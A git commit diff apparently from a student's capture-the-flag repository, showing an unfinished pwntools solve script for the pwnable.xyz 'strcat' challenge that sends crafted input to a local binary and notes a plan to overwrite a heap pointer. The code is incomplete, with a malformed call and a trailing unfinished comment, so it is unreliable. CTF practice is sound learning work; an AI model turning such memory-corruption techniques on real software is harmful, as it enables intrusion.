a389773e04c21172c807498b9f78330ae1f31ccc
Dillon Wu <dillonw@andrew.cmu.edu>
2024-03-13 22:38:23 -0400

    working on strcat

--- pwnable-xyz/strcat/solve.py
+++ pwnable-xyz/strcat/solve.py
@@ -2,7 +2,14 @@ from pwn import *
 
 r = process('./challenge')
 
-r.sendafter(": ", "\x00")
-r.sendafter(": ", "\x00")
-r.recvuntil("> ")
 gdb.attach(r)
+r.sendafter(": ", "\x00") # name is 129 bytes long
+r.sendafter(": ", "a" * 20)
+r.recvuntil("> ")
+
+# increment until the maxlen is 
+for i in range(8):
+    r.sendafter("k")
+
+
+# overwrite malloc_ptr with your own pointer should be the goal i think
